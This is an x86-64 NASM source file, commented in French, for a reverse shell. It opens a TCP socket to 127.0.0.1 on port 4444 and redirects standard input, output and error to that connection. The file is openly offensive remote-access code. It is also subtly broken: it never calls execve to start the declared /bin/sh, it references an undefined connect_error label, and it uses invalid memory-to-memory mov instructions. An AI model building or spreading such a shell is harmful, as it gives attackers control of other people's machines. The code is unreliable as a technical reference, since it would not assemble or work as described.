; reverse_shell.asm
; Reverse shell en assembleur x86-64
; 
; Compilation:
; nasm -f elf64 -o reverse_shell.o reverse_shell.asm
; ld -o reverse_shell reverse_shell.o
;

section .data
    ; Constantes pour les appels sys
    SYS_SOCKET equ 41
    SYS_CONNECT equ 42
    SYS_DUP2 equ 33
    SYS_EXECVE equ 59
    SYS_EXIT equ 60

    ; Constantes pour socket
    AF_INET equ 2
    SOCK_STREAM equ 1
    IPPROTO_IP equ 0

    ; Config de la connexion
    ip dd 0x0100007f       ; 127.0.0.1 en format réseau (little-endian)
    port dw 0x5c11         ; Port 4444 (0x115c)
    ; Messages d'erreur
    error_socket db "Erreur lors de la création du socket", 10, 0
    error_connect db "Erreur de connexion au serveur", 10, 0
    
    ; path pour shell
    shell db "/bin/sh", 0
    args db 0
    env db 0

section .bss
    sockfd resq 1
    sockaddr_in resb 16 ; Struct pour stocker l'IP de connexion

section .text
    global _start

_start:
    ; Étape 1: Création du socket
    mov rax, SYS_SOCKET
    mov rdi, AF_INET       ; Famille d'adresses
    mov rsi, SOCK_STREAM   ; Type de socket
    mov rdx, IPPROTO_IP    ; Protocole
    syscall
    
    ; Vérification d'erreur
    test rax, rax
    js socket_error
    
    ; Sauvegarde du descripteur de socket
    mov [sockfd], rax
    ; Remplissage de la structure
    mov word [sockaddr_in], AF_INET
    mov word [sockaddr_in + 2], [port]
    mov dword [sockaddr_in + 4], [ip]

    mov rax, SYS_CONNECT               ; connexion au serv
    mov rdi, [sockfd]                  ; descripteur de socket
    mov rsi, sockaddr_in               ; adresse de connexion
    mov rdx, 16                        ; taille structure
    syscall
    test rax, rax
    js connect_error

    ; la connexion est établie
    ; redirection des flux et exec du shell
        ; Redirection de STDIN (0)
    mov rax, SYS_DUP2
    mov rdi, [sockfd]
    xor rsi, rsi           ; STDIN = 0
    syscall
    
    ; Redirection de STDOUT (1)
    mov rax, SYS_DUP2
    mov rdi, [sockfd]
    mov rsi, 1             ; STDOUT = 1
    syscall
    
    ; Redirection de STDERR (2)
    mov rax, SYS_DUP2
    mov rdi, [sockfd]
    mov rsi, 2             ; STDERR = 2
    syscall
    jmp exit

socket_error:
    ; ERROR
    jmp exit
    
exit:
    ; END
    mov rax, SYS_EXIT
    xor rdi, rdi
    syscall
